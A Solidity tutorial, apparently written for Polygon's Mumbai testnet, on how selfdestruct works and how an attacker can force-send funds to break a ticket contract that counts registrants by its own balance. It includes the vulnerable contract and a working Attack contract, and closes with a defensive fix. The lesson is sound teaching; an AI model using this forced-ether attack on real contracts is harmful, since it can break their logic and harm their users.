# Exploiting selfdestruct()
Welcome to this new Polygon quest. You can follow this quest on Remix, no need for Hardhat (See, I keep my promises). Make sure you are on Mumbai and you have enough tokens. What are we waiting for! Let's go.
In this quest, you will learn about the _selfdestruct_ function in Solidity and how it can be used to hack contracts that follow a specific pattern. Firstly, we are going to write a contract that implements _selfdestruct_. Also, we are going to point out possible unexpected behaviors that can happen if you do not implement safety measures. Lastly, we are going to write a “hackable” smart contract and hack it. Seems fun? Let's see.

Note that you can modify _msg.values_ the way you like. I chose natural numbers just for demonstration purposes.

## What is selfdestruct()?
Well, it is a function that deletes your contract from the blockchain. Or to put it in other words, it makes it dysfunctional. After you call _selfdestruct_, people can still interact with your contract by calling functions but nothing really will happen (no state changes will be recorded). You use this function as a safety button, you can use it to send all the balances in your account to a specified address. Imagine if you discovered that you got hacked and someone is withdrawing your funds, you can just call _selfdestruct_ with your address as a parameter and save what can be saved. Let’s jump to the implementation, we will use the good old storage contract to explain how _selfdestruct_ works and how to avoid unexpected behaviors.
Go ahead and include this snippet in your Remix:

```js
// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;
 
contract Storage {
   uint256 public number;
   address payable public owner;
 
   constructor() {
       owner = payable(msg.sender);
   }
   function setNumber(uint256 num) public {
       number = num;
   }
 
   function destroy() public {
       require (msg.sender == owner);
       selfdestruct(owner);
   }
}
```

This is a simple contract that lets you store your favorite number, gives you ownership, and allows you to destroy it sending funds to your address. You can of course configure it to send your funds to another address. Now go to Remix’s Deply&Run Transactions window and start interacting with it. At first, store a number and try to return it by clicking on the number button, works fine! Check the owner, it should be your address, the one you used to deploy the contract. Now call the destroy function and check the owner again, it is the zero address! Technically your contract got “burned”. But you still can call _setNumber_ with seemingly no problems at all, but it is not really doing anything, it is just making you lose money as it will not perform state changes. If you click on the number button you will get 0 as a result no matter what number you entered. 
So, when you use _selfdestruct_, make sure to inform users not to use the contract anymore. Or create a state variable (call it destroyed for example), and check it in a require statement in every function so that users will know the contract has stopped working. Ok cool, let’s do some hacking now!

## A vulnerable contract:
Now let’s imagine the following scenario, you are about to present an important lecture about the selfdestruct hack. You are too cool to sell tickets the normal way, so you wrote a smart contract to do the job:

```js
// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;
 
contract Register {
    mapping(address => bool) registered;
 
   function register() public payable {
       require(msg.value == 1 ether);
       require(address(this).balance <= 10 ether);
       registered[msg.sender] = true;
   }
 
   function getNumberOfRegistrants() public view returns (uint256) {
       return address(this).balance / (10**18);
   }
}
```

This contract allows you to register after you pay 1 MATIC. But there are only 10 chairs so you made sure to put that into consideration. Now since every registrant pays 1 MATIC to register, you should expect 10 MATICs for 10 registrants. You expect the same logic to work in getNumberOfRegistrants. Let’s introduce our malicious actor Bob, who knows how to use selfdestruct and does not want anybody else to learn (Bad Bob). So Bad Bob decided to write a contract that implements selfdestruct to send MATIC to your contract and prevent the other 9 knowledge lovers from attending. He registered first as a normal attendant. You were careful enough and did not include a receive function that allows random people to send MATIC. But Bad Bob got the better of you, let’s see his code.

## Hacking the vulnerable contract:
Bad Bob simply did the following: He sent 9 MATICs to his Attack contract, created an instance of the Register contract to interact with, and selfdestructed his Attack contract with your contract’s address as a parameter! Now your contract’s balance is 10 and your logic broke!

```js
import "./Register.sol";

contract Attack {
   Register registerAddress;
 
   constructor(Register _registerAddress) {
       registerAddress = Register(_registerAddress);
   }
 
   receive() external payable {}
    
   function attack() public payable {
       address payable addr = payable(address(registerAddress));
       selfdestruct(addr);
   }
}
```

Now your contract tells you there are 10 registrants, but you entered the lecture hall finding only Bad Bob smiling at you.

## Final remarks:
When using selfdestruct, make sure to find a way to inform your users that you destroyed the contracts. And be extremely careful with this(address).balance, just don’t rely on it, it can be easily hacked. Simply create a state field, call it “balance” for example, and use it to manage conditions and require statements. And also, remember to include selfdestruct in your code, you never know what would happen.
The end! Now you know one more cool thing about Solidity. Keep going and happy hacking!

